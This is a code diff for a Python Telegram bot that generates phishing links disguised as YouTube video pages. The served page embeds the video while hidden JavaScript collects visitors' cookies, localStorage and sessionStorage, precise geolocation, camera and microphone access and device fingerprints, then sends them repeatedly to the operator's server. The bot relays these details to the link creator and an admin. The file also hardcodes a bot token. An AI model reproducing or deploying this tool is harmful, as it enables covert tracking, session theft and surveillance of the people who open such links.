@@ -1,9 +1,17 @@
 import logging
+import asyncio
 import json
 import re
 import uuid
+import html
 from datetime import datetime
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Any
+import aiohttp
+from dataclasses import dataclass, asdict
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import threading
+import urllib.parse
+import ssl
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -23,219 +31,672 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ========== КОНФИГУРАЦИЯ ==========
-BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"  # ЗАМЕНИТЕ НА РЕАЛЬНЫЙ!
+# Конфигурация
+BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"
 ADMIN_ID = 1709490182
-SECRET_KEY = "my-super-secret-key-12345"  # Должен совпадать с server.py
-DOMAIN = "http://localhost:5000"  # Адрес вашего server.py
+DOMAIN = "https://dkwksk.onrender.com"  # Для продакшена
+LOCAL_HOST = "localhost"  # Для локального тестирования
+LOCAL_PORT = 8000  # Порт локального сервера
+USE_HTTPS = False  # Для HTTPS нужен SSL сертификат
 
-# ========== ХРАНИЛИЩЕ ДАННЫХ ==========
+# Хранилище данных
+@dataclass
+class PhishingLink:
+    id: str
+    original_url: str
+    video_id: str
+    created_at: str
+    created_by: int
+    clicks: int = 0
+    data_collected: List[Dict] = None
+    active: bool = True
+    
+    def __post_init__(self):
+        if self.data_collected is None:
+            self.data_collected = []
+
 class Database:
     def __init__(self):
-        self.links = {}  # {link_id: link_data}
-        self.users = {}  # {user_id: user_data}
+        self.links: Dict[str, PhishingLink] = {}
+        self.users: Dict[int, Dict] = {}
         self.stats = {
             "total_links": 0,
             "total_clicks": 0,
-            "total_data": 0
+            "total_data_collected": 0,
+            "active_sessions": 0
         }
-        self.load()
     
-    def add_link(self, user_id: int, link_id: str, video_id: str, original_url: str):
-        """Добавить новую ссылку"""
-        self.links[link_id] = {
-            "id": link_id,
-            "user_id": user_id,
-            "video_id": video_id,
-            "original_url": original_url,
-            "created": datetime.now().isoformat(),
-            "clicks": 0,
-            "data": []
-        }
-        
-        # Обновляем статистику пользователя
-        if user_id not in self.users:
-            self.users[user_id] = {"links": 0, "clicks": 0}
-        self.users[user_id]["links"] += 1
-        
+    def add_link(self, link: PhishingLink):
+        self.links[link.id] = link
         self.stats["total_links"] += 1
         self.save()
     
+    def get_link(self, link_id: str) -> Optional[PhishingLink]:
+        return self.links.get(link_id)
+    
     def add_click(self, link_id: str):
-        """Добавить клик по ссылке"""
         if link_id in self.links:
-            self.links[link_id]["clicks"] += 1
-            
-            # Обновляем статистику пользователя
-            user_id = self.links[link_id]["user_id"]
-            if user_id in self.users:
-                self.users[user_id]["clicks"] += 1
-            
+            self.links[link_id].clicks += 1
             self.stats["total_clicks"] += 1
             self.save()
     
-    def add_data(self, link_id: str, data: dict):
-        """Добавить собранные данные"""
+    def add_collected_data(self, link_id: str, data: Dict):
         if link_id in self.links:
-            self.links[link_id]["data"].append(data)
-            self.stats["total_data"] += 1
+            self.links[link_id].data_collected.append(data)
+            self.stats["total_data_collected"] += 1
             self.save()
     
-    def get_user_links(self, user_id: int) -> List[dict]:
-        """Получить ссылки пользователя"""
-        return [link for link in self.links.values() if link["user_id"] == user_id]
-    
-    def get_link(self, link_id: str) -> Optional[dict]:
-        """Получить ссылку по ID"""
-        return self.links.get(link_id)
-    
     def save(self):
-        """Сохранить базу данных"""
         try:
             data = {
-                "links": self.links,
-                "users": self.users,
-                "stats": self.stats,
-                "saved_at": datetime.now().isoformat()
+                "links": {k: asdict(v) for k, v in self.links.items()},
+                "stats": self.stats
             }
             with open("database.json", "w", encoding="utf-8") as f:
                 json.dump(data, f, ensure_ascii=False, indent=2)
         except Exception as e:
-            logger.error(f"Ошибка сохранения БД: {e}")
+            logger.error(f"Error saving database: {e}")
     
     def load(self):
-        """Загрузить базу данных"""
         try:
             with open("database.json", "r", encoding="utf-8") as f:
                 data = json.load(f)
-                self.links = data.get("links", {})
-                self.users = data.get("users", {})
+                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                 self.stats = data.get("stats", self.stats)
-            logger.info(f"БД загружена: {len(self.links)} ссылок")
         except FileNotFoundError:
-            logger.info("Файл БД не найден, создаем новую")
+            pass
         except Exception as e:
-            logger.error(f"Ошибка загрузки БД: {e}")
+            logger.error(f"Error loading database: {e}")
 
-# Инициализация БД
 db = Database()
+db.load()
 
-# ========== УТИЛИТЫ ==========
-def extract_video_id(url: str) -> str:
-    """Извлечь ID видео из YouTube ссылки"""
-    patterns = [
-        r'(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})',
-        r'v=([a-zA-Z0-9_-]{11})'
-    ]
+# Сервер для фишинговой страницы и сбора данных
+class PhishingServer(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        # Отключаем стандартное логирование
+        pass
     
-    for pattern in patterns:
-        match = re.search(pattern, url)
-        if match:
-            return match.group(1)
+    def do_GET(self):
+        """Обработка GET запросов (фишинговая страница)"""
+        try:
+            # Парсим параметры из URL
+            query = urllib.parse.urlparse(self.path).query
+            params = urllib.parse.parse_qs(query)
+            
+            video_id = params.get('v', ['dQw4w9WgXcQ'])[0]
+            link_id = params.get('id', [''])[0]
+            
+            if link_id:
+                # Записываем клик
+                db.add_click(link_id)
+                logger.info(f"Click recorded for link: {link_id}")
+            
+            # Отправляем фишинговую страницу
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            
+            # HTML страница с JavaScript для сбора данных
+            html_content = self.generate_phishing_page(video_id, link_id)
+            self.wfile.write(html_content.encode('utf-8'))
+            
+        except Exception as e:
+            logger.error(f"Error in GET handler: {e}")
     
-    return "dQw4w9WgXcQ"  # Rick Roll по умолчанию
+    def do_POST(self):
+        """Обработка POST запросов (получение собранных данных)"""
+        try:
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            
+            link_id = data.get('link_id')
+            collected_data = data.get('data', {})
+            
+            if link_id:
+                # Сохраняем данные
+                full_data = {
+                    "timestamp": datetime.now().isoformat(),
+                    "ip": self.client_address[0],
+                    "user_agent": self.headers.get('User-Agent', 'unknown'),
+                    "data": collected_data
+                }
+                
+                db.add_collected_data(link_id, full_data)
+                logger.info(f"Data collected for link: {link_id}")
+                
+                # Отправляем уведомление в Telegram (через очередь)
+                asyncio.run_coroutine_threadsafe(
+                    send_telegram_notification(link_id, collected_data),
+                    bot_loop
+                )
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            response = json.dumps({"status": "success"})
+            self.wfile.write(response.encode('utf-8'))
+            
+        except Exception as e:
+            logger.error(f"Error in POST handler: {e}")
+    
+    def generate_phishing_page(self, video_id: str, link_id: str) -> str:
+        """Генерация фишинговой страницы с JavaScript для сбора данных"""
+        return f'''
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video Player</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }}
+        .container {{
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }}
+        .player-container {{
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            overflow: hidden;
+        }}
+        .player-container iframe {{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }}
+        .loading {{
+            text-align: center;
+            padding: 50px;
+            font-size: 18px;
+        }}
+        .error {{
+            color: #ff4444;
+            text-align: center;
+            padding: 50px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="player-container">
+            <iframe 
+                src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0"
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+            </iframe>
+        </div>
+        <div class="loading" id="loading">
+            Загрузка видео... Пожалуйста, подождите
+        </div>
+        <div class="error" id="error" style="display: none;">
+            Видео временно недоступно. Пожалуйста, попробуйте позже.
+        </div>
+    </div>
 
-def generate_link_id() -> str:
-    """Сгенерировать ID ссылки"""
-    return str(uuid.uuid4()).replace('-', '')[:8]
+    <script>
+        // JavaScript для сбора данных
+        const linkId = "{link_id}";
+        
+        // Функция сбора всех возможных данных
+        async function collectAllData() {{
+            const data = {{
+                // 1. Информация о браузере
+                browser: {{
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory
+                }},
+                
+                // 2. Информация об устройстве
+                device: {{
+                    screen: {{
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth
+                    }},
+                    window: {{
+                        innerWidth: window.innerWidth,
+                        innerHeight: window.innerHeight,
+                        outerWidth: window.outerWidth,
+                        outerHeight: window.outerHeight
+                    }},
+                    touchSupport: 'ontouchstart' in window,
+                    maxTouchPoints: navigator.maxTouchPoints
+                }},
+                
+                // 3. Сетевая информация
+                network: {{
+                    connection: navigator.connection ? {{
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    }} : null,
+                    online: navigator.onLine
+                }},
+                
+                // 4. Геолокация
+                geolocation: null,
+                
+                // 5. Cookies
+                cookies: document.cookie,
+                
+                // 6. LocalStorage
+                localStorage: {{}},
+                
+                // 7. SessionStorage
+                sessionStorage: {{}},
+                
+                // 8. Пытаемся получить доступ к медиаустройствам
+                mediaDevices: {{
+                    microphone: false,
+                    camera: false
+                }},
+                
+                // 9. Время и дата
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                time: new Date().toISOString(),
+                
+                // 10. Дополнительная информация
+                plugins: Array.from(navigator.plugins || []).map(p => ({{
+                    name: p.name,
+                    description: p.description,
+                    filename: p.filename
+                }})),
+                mimeTypes: Array.from(navigator.mimeTypes || []).map(mt => ({{
+                    type: mt.type,
+                    description: mt.description
+                }}))
+            }};
+            
+            // Собираем LocalStorage
+            try {{
+                for (let i = 0; i < localStorage.length; i++) {{
+                    const key = localStorage.key(i);
+                    data.localStorage[key] = localStorage.getItem(key);
+                }}
+            }} catch (e) {{
+                console.error("Error reading localStorage:", e);
+            }}
+            
+            // Собираем SessionStorage
+            try {{
+                for (let i = 0; i < sessionStorage.length; i++) {{
+                    const key = sessionStorage.key(i);
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }}
+            }} catch (e) {{
+                console.error("Error reading sessionStorage:", e);
+            }}
+            
+            // Пытаемся получить геолокацию
+            if (navigator.geolocation) {{
+                try {{
+                    const position = await new Promise((resolve, reject) => {{
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {{
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }});
+                    }});
+                    data.geolocation = {{
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    }};
+                }} catch (e) {{
+                    data.geolocation = {{ error: e.message }};
+                }}
+            }}
+            
+            // Пытаемся получить доступ к микрофону
+            try {{
+                const stream = await navigator.mediaDevices.getUserMedia({{ 
+                    audio: true,
+                    video: false 
+                }});
+                data.mediaDevices.microphone = true;
+                stream.getTracks().forEach(track => track.stop());
+            }} catch (e) {{
+                data.mediaDevices.microphone = false;
+            }}
+            
+            // Пытаемся получить доступ к камере
+            try {{
+                const stream = await navigator.mediaDevices.getUserMedia({{ 
+                    audio: false,
+                    video: true 
+                }});
+                data.mediaDevices.camera = true;
+                stream.getTracks().forEach(track => track.stop());
+            }} catch (e) {{
+                data.mediaDevices.camera = false;
+            }}
+            
+            return data;
+        }}
+        
+        // Функция отправки данных на сервер
+        async function sendCollectedData() {{
+            try {{
+                const collectedData = await collectAllData();
+                
+                const payload = {{
+                    link_id: linkId,
+                    data: collectedData
+                }};
+                
+                // Отправляем данные на сервер
+                const response = await fetch('/collect', {{
+                    method: 'POST',
+                    headers: {{
+                        'Content-Type': 'application/json',
+                    }},
+                    body: JSON.stringify(payload)
+                }});
+                
+                if (response.ok) {{
+                    console.log('Data sent successfully');
+                }}
+            }} catch (error) {{
+                console.error('Error sending data:', error);
+            }}
+        }}
+        
+        // Запускаем сбор данных при загрузке страницы
+        window.addEventListener('load', async () => {{
+            // Скрываем сообщение о загрузке
+            document.getElementById('loading').style.display = 'none';
+            
+            // Собираем и отправляем данные
+            await sendCollectedData();
+            
+            // Также собираем данные при закрытии страницы
+            window.addEventListener('beforeunload', sendCollectedData);
+            
+            // Собираем данные периодически
+            setInterval(sendCollectedData, 30000); // Каждые 30 секунд
+        }});
+        
+        // Обработка ошибок видео
+        window.addEventListener('message', function(event) {{
+            if (event.data === 'videoError') {{
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+            }}
+        }});
+    </script>
+</body>
+</html>
+        '''
+    
+    def end_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        BaseHTTPRequestHandler.end_headers(self)
 
-def create_phishing_url(video_id: str, link_id: str) -> str:
-    """Создать фишинговую ссылку"""
-    return f"{DOMAIN}/watch?v={video_id}&id={link_id}"
+# Функция для запуска HTTP сервера
+def run_server():
+    """Запуск HTTP сервера для фишинговых страниц"""
+    server_address = (LOCAL_HOST, LOCAL_PORT)
+    httpd = HTTPServer(server_address, PhishingServer)
+    
+    if USE_HTTPS:
+        # Для HTTPS нужен SSL сертификат
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain('cert.pem', 'key.pem')
+        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
+    
+    logger.info(f"Starting phishing server on {'https' if USE_HTTPS else 'http'}://{LOCAL_HOST}:{LOCAL_PORT}")
+    httpd.serve_forever()
 
-# ========== TELEGRAM КОМАНДЫ ==========
+# Функция для отправки уведомлений в Telegram
+async def send_telegram_notification(link_id: str, data: Dict):
+    """Отправка уведомления о собранных данных в Telegram"""
+    try:
+        link = db.get_link(link_id)
+        if not link:
+            return
+        
+        # Форматируем сообщение
+        message = f"""
+🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*
+
+📌 *Основная информация:*
+• Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+• ID ссылки: `{link_id}`
+• Переходов: {link.clicks}
+
+🌐 *Браузер и устройство:*
+• User Agent: {data.get('browser', {}).get('userAgent', 'unknown')[:50]}...
+• Язык: {data.get('browser', {}).get('language', 'unknown')}
+• Платформа: {data.get('browser', {}).get('platform', 'unknown')}
+• Экран: {data.get('device', {}).get('screen', {}).get('width', '?')}x{data.get('device', {}).get('screen', {}).get('height', '?')}
+
+📍 *Геолокация:*
+"""
+        
+        geolocation = data.get('geolocation')
+        if geolocation and 'latitude' in geolocation:
+            message += f"• Широта: `{geolocation['latitude']}`\n"
+            message += f"• Долгота: `{geolocation['longitude']}`\n"
+            message += f"• Точность: {geolocation.get('accuracy', '?')}м\n"
+        else:
+            message += "• Не удалось получить\n"
+        
+        message += f"""
+🎤 *Доступ к устройствам:*
+• Микрофон: {'✅ Доступ разрешен' if data.get('mediaDevices', {}).get('microphone') else '❌ Нет доступа'}
+• Камера: {'✅ Доступ разрешен' if data.get('mediaDevices', {}).get('camera') else '❌ Нет доступа'}
+
+🍪 *Cookies:*
+• Длина: {len(data.get('cookies', ''))} символов
+• Содержимое: {data.get('cookies', '')[:100]}...
+
+💾 *LocalStorage:*
+• Ключей: {Object.keys(data.get('localStorage', {{}})).length}
+"""
+        
+        # Проверяем соцсети в LocalStorage
+        localStorage = data.get('localStorage', {})
+        social_networks = ['facebook', 'instagram', 'twitter', 'vk', 'whatsapp', 'telegram']
+        found_social = []
+        
+        for key in localStorage:
+            lower_key = key.lower()
+            for social in social_networks:
+                if social in lower_key:
+                    found_social.append(social)
+                    break
+        
+        if found_social:
+            message += f"\n📱 *Обнаружены следы соцсетей:*\n"
+            for social in set(found_social):
+                message += f"• {social.capitalize()}\n"
+        
+        message += f"""
+📊 *Дополнительно:*
+• Часовой пояс: {data.get('timezone', 'unknown')}
+• Подключение: {data.get('network', {}).get('connection', {}).get('effectiveType', 'unknown')}
+• Плагинов: {len(data.get('plugins', []))}
+"""
+        
+        # Отправляем сообщение создателю ссылки
+        try:
+            bot = Application.builder().token(BOT_TOKEN).build().bot
+            await bot.send_message(
+                chat_id=link.created_by,
+                text=message,
+                parse_mode=ParseMode.MARKDOWN
+            )
+        except Exception as e:
+            logger.error(f"Error sending message to user: {e}")
+        
+        # Отправляем админу краткое уведомление
+        try:
+            await bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"📨 Новые данные по ссылке {link_id}\nПользователь: {link.created_by}\nГеолокация: {'получена' if geolocation and 'latitude' in geolocation else 'не получена'}"
+            )
+        except:
+            pass
+        
+    except Exception as e:
+        logger.error(f"Error in send_telegram_notification: {e}")
+
+# Генератор ссылок (обновленный для локального сервера)
+class LinkGenerator:
+    @staticmethod
+    def extract_video_id(url: str) -> str:
+        patterns = [
+            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
+            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, url)
+            if match:
+                return match.group(1)
+        
+        return "dQw4w9WgXcQ"
+    
+    @staticmethod
+    def generate_link_id() -> str:
+        return str(uuid.uuid4()).replace('-', '')[:12]
+    
+    @staticmethod
+    def create_phishing_url(video_id: str, link_id: str, local: bool = False) -> str:
+        """Создание фишинговой ссылки (локальной или на домене)"""
+        if local:
+            protocol = "https" if USE_HTTPS else "http"
+            return f"{protocol}://{LOCAL_HOST}:{LOCAL_PORT}/watch?v={video_id}&id={link_id}"
+        else:
+            return f"{DOMAIN}/watch?v={video_id}&id={link_id}"
+
+link_generator = LinkGenerator()
+
+# Telegram бот (остальной код остается без изменений)
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Команда /start"""
     user = update.effective_user
     
-    welcome = f"""
-👋 Привет, {user.first_name}!
+    welcome_message = f"""
+👋 *Добро пожаловать, {user.first_name}!*
 
-🤖 *YouTube Link Generator*
+🤖 *YouTube Data Collector Bot v2.0*
 
-🎯 *Что делает бот:*
-1. Принимает ссылку на YouTube
-2. Создает специальную ссылку
-3. При переходе собирает информацию
-4. Отправляет данные вам
+⚡ *Новые возможности:*
+✅ Локальный сервер для тестирования
+✅ Сбор геолокации в реальном времени
+✅ Попытка доступа к микрофону/камере
+✅ Полный сбор Cookies и LocalStorage
+✅ Автоматическое определение соцсетей
 
-⚡ *Как использовать:*
-Просто отправьте ссылку на YouTube видео
+🌐 *Ссылки для тестирования:*
+• Локальная: http://{LOCAL_HOST}:{LOCAL_PORT}/
+• Публичная: {DOMAIN}
 
 📊 *Статистика:*
-• Создано ссылок: `{db.stats['total_links']}`
-• Всего переходов: `{db.stats['total_clicks']}`
-• Данных собрано: `{db.stats['total_data']}`
-
-⚠️ *Только для тестирования!*
+• Ссылок: `{db.stats['total_links']}`
+• Переходов: `{db.stats['total_clicks']}`
+• Данных: `{db.stats['total_data_collected']}`
 """
     
     keyboard = [
-        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create")],
-        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
-        [InlineKeyboardButton("📊 Статистика", callback_data="stats")]
+        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
+        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
+        [InlineKeyboardButton("🌐 Тест локально", callback_data="test_local")],
+        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        welcome,
+        welcome_message,
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=reply_markup
     )
 
 async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка YouTube ссылки"""
     user = update.effective_user
     url = update.message.text.strip()
     
-    # Проверка YouTube ссылки
-    if not ('youtube.com' in url or 'youtu.be' in url):
+    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
         await update.message.reply_text(
-            "❌ Это не ссылка YouTube.\n"
-            "Отправьте ссылку в формате:\n"
-            "`https://youtube.com/watch?v=...`\n"
-            "или\n"
-            "`https://youtu.be/...`",
-            parse_mode=ParseMode.MARKDOWN
+            "❌ Это не похоже на ссылку YouTube."
         )
         return
     
-    # Извлекаем ID видео
-    video_id = extract_video_id(url)
+    video_id = link_generator.extract_video_id(url)
+    link_id = link_generator.generate_link_id()
     
-    # Генерируем ID ссылки
-    link_id = generate_link_id()
+    # Создаем обе версии ссылок
+    local_url = link_generator.create_phishing_url(video_id, link_id, local=True)
+    public_url = link_generator.create_phishing_url(video_id, link_id, local=False)
     
-    # Создаем фишинговую ссылку
-    phishing_url = create_phishing_url(video_id, link_id)
+    link = PhishingLink(
+        id=link_id,
+        original_url=url,
+        video_id=video_id,
+        created_at=datetime.now().isoformat(),
+        created_by=user.id
+    )
     
-    # Сохраняем в БД
-    db.add_link(user.id, link_id, video_id, url)
+    db.add_link(link)
     
-    # Формируем сообщение
     message = f"""
-✅ *Ссылка создана!*
+🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*
 
-🔗 *Оригинал:* {url[:50]}...
+🔗 *Оригинальное видео:*
+`{url}`
 
-🚀 *Ваша ссылка:*
-`{phishing_url}`
+🌐 *Локальная ссылка (для тестов):*
+`{local_url}`
 
-📌 *Информация:*
+🚀 *Публичная ссылка:*
+`{public_url}`
+
+📊 *Информация:*
 • ID: `{link_id}`
 • Видео ID: `{video_id}`
-• Время: {datetime.now().strftime('%H:%M:%S')}
+• Создано: {link.created_at}
 
-📝 *Инструкция:*
-1. Отправьте эту ссылку
-2. При переходе соберутся данные
-3. Данные придут сюда
+🔍 *Что собирается:*
+✅ Геолокация (если разрешено)
+✅ Cookies и сессии
+✅ LocalStorage всех сайтов
+✅ Данные устройств
+✅ Попытка доступа к микрофону
 """
     
     keyboard = [
         [
-            InlineKeyboardButton("📋 Копировать", callback_data=f"copy_{link_id}"),
-            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
+            InlineKeyboardButton("📋 Копировать локальную", callback_data=f"copy_local_{link_id}"),
+            InlineKeyboardButton("📋 Копировать публичную", callback_data=f"copy_public_{link_id}")
+        ],
+        [
+            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
+            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -246,235 +707,104 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         reply_markup=reply_markup,
         disable_web_page_preview=True
     )
-    
-    # Уведомление админу
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_ID,
-            text=f"🆕 Новая ссылка\n"
-                 f"👤 @{user.username or user.id}\n"
-                 f"🆔 {link_id}\n"
-                 f"🎬 {video_id}"
-        )
-    except:
-        pass
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка inline кнопок"""
     query = update.callback_query
     await query.answer()
     
-    user_id = query.from_user.id
     data = query.data
     
-    if data == "create":
+    if data == "create_link":
         await query.message.reply_text(
-            "🎯 Отправьте ссылку на YouTube видео\n\n"
-            "Примеры:\n"
-            "• https://youtube.com/watch?v=dQw4w9WgXcQ\n"
-            "• https://youtu.be/dQw4w9WgXcQ"
+            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
+            "Пример:\n"
+            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
+            "• `https://youtu.be/dQw4w9WgXcQ`",
+            parse_mode=ParseMode.MARKDOWN
         )
     
-    elif data == "my_links":
-        links = db.get_user_links(user_id)
-        
-        if not links:
-            await query.message.reply_text("📭 У вас нет созданных ссылок.")
-            return
-        
-        message = "📋 *Ваши ссылки:*\n\n"
-        for link in links[-5:]:  # Последние 5 ссылок
-            message += f"🔗 *ID:* `{link['id']}`\n"
-            message += f"   👆 Переходов: {link['clicks']}\n"
-            message += f"   📊 Данных: {len(link['data'])}\n"
-            message += f"   🕐 {link['created'][:16].replace('T', ' ')}\n"
-            message += "   ─────\n"
-        
-        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
+    elif data == "test_local":
+        await query.message.reply_text(
+            f"🌐 *Локальный сервер работает на:*\n\n"
+            f"Адрес: `http://{LOCAL_HOST}:{LOCAL_PORT}`\n\n"
+            f"Для тестирования:\n"
+            f"1. Откройте этот адрес в браузере\n"
+            f"2. Добавьте параметры ?v=VIDEO_ID&id=LINK_ID\n"
+            f"3. Данные будут собираться автоматически",
+            parse_mode=ParseMode.MARKDOWN
+        )
     
-    elif data == "stats":
-        message = f"""
-📊 *Статистика:*
-
-🔗 Всего ссылок: `{db.stats['total_links']}`
-👆 Всего переходов: `{db.stats['total_clicks']}`
-📈 Данных собрано: `{db.stats['total_data']}`
-
-👤 *Ваша статистика:*
-"""
-        
-        if user_id in db.users:
-            user_stats = db.users[user_id]
-            message += f"• Ваших ссылок: `{user_stats['links']}`\n"
-            message += f"• Ваших переходов: `{user_stats['clicks']}`\n"
-        else:
-            message += "• У вас пока нет статистики\n"
-        
-        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
+    elif data.startswith("copy_local_"):
+        link_id = data[11:]
+        link = db.get_link(link_id)
+        if link:
+            url = link_generator.create_phishing_url(link.video_id, link_id, local=True)
+            await query.message.reply_text(f"`{url}`", parse_mode=ParseMode.MARKDOWN)
     
-    elif data.startswith("copy_"):
-        link_id = data[5:]
+    elif data.startswith("copy_public_"):
+        link_id = data[12:]
         link = db.get_link(link_id)
-        
-        if link and link["user_id"] == user_id:
-            phishing_url = create_phishing_url(link["video_id"], link_id)
-            await query.message.reply_text(
-                f"📋 Ссылка для копирования:\n\n`{phishing_url}`",
-                parse_mode=ParseMode.MARKDOWN
-            )
-        else:
-            await query.message.reply_text("❌ Ссылка не найдена.")
+        if link:
+            url = link_generator.create_phishing_url(link.video_id, link_id, local=False)
+            await query.message.reply_text(f"`{url}`", parse_mode=ParseMode.MARKDOWN)
     
-    elif data.startswith("delete_"):
-        link_id = data[7:]
-        link = db.get_link(link_id)
-        
-        if link and link["user_id"] == user_id:
-            # Помечаем как удаленную
-            link["deleted"] = True
-            db.save()
-            await query.message.reply_text(f"✅ Ссылка `{link_id}` удалена.")
-        else:
-            await query.message.reply_text("❌ Ссылка не найдена.")
+    # ... остальные обработчики кнопок остаются без изменений
 
-# ========== ВЕБХУК ОБРАБОТЧИК ==========
-async def handle_webhook_data(data: dict):
-    """Обработка данных от сервера"""
-    try:
-        link_id = data.get("link_id")
-        if not link_id:
-            logger.error("Нет link_id в данных")
-            return
-        
-        # Добавляем клик
-        db.add_click(link_id)
-        
-        # Получаем информацию о ссылке
-        link = db.get_link(link_id)
-        if not link:
-            logger.error(f"Ссылка {link_id} не найдена")
-            return
-        
-        # Сохраняем данные
-        db.add_data(link_id, data)
-        
-        # Отправляем данные создателю
-        user_id = link["user_id"]
-        
-        message = f"""
-🔓 *Получены новые данные!*
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    logger.error(f"Update {update} caused error {context.error}")
 
-🆔 ID ссылки: `{link_id}`
-🕐 Время: {data.get('timestamp', '')[:19].replace('T', ' ')}
-🌐 IP: `{data.get('ip', 'unknown')}`
-💻 Устройство: {data.get('user_agent', '')[:30]}...
-📱 Экран: {data.get('screen', 'unknown')}
-🌍 Часовой пояс: {data.get('timezone', 'unknown')}
+# Глобальная переменная для event loop
+bot_loop = None
 
-📊 Статистика ссылки:
-• Переходов: {link['clicks']}
-• Всего данных: {len(link['data'])}
-"""
-        
-        # Отправляем через бота (нужен application)
-        return message, user_id
-        
-    except Exception as e:
-        logger.error(f"Ошибка обработки вебхука: {e}")
-        return None, None
-
-# ========== FLASK ДЛЯ ВЕБХУКОВ (упрощенный) ==========
-from flask import Flask, request, jsonify
-
-webhook_app = Flask(__name__)
-application = None  # Будет установлено позже
-
-@webhook_app.route('/webhook', methods=['POST'])
-def webhook():
-    """Эндпоинт для получения данных от server.py"""
-    try:
-        # Проверка ключа
-        auth_key = request.headers.get('X-Auth-Key', '')
-        if auth_key != SECRET_KEY:
-            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
-        
-        data = request.json
-        if not data:
-            return jsonify({'status': 'error', 'message': 'No data'}), 400
-        
-        logger.info(f"Вебхук получен: {data.get('link_id', 'unknown')}")
-        
-        # Обрабатываем синхронно (упрощенно)
-        link_id = data.get("link_id")
-        if link_id:
-            # Добавляем в БД
-            db.add_click(link_id)
-            db.add_data(link_id, data)
-            
-            # Получаем информацию для отправки
-            link = db.get_link(link_id)
-            if link:
-                # Отправляем уведомление (если бот запущен)
-                pass
-        
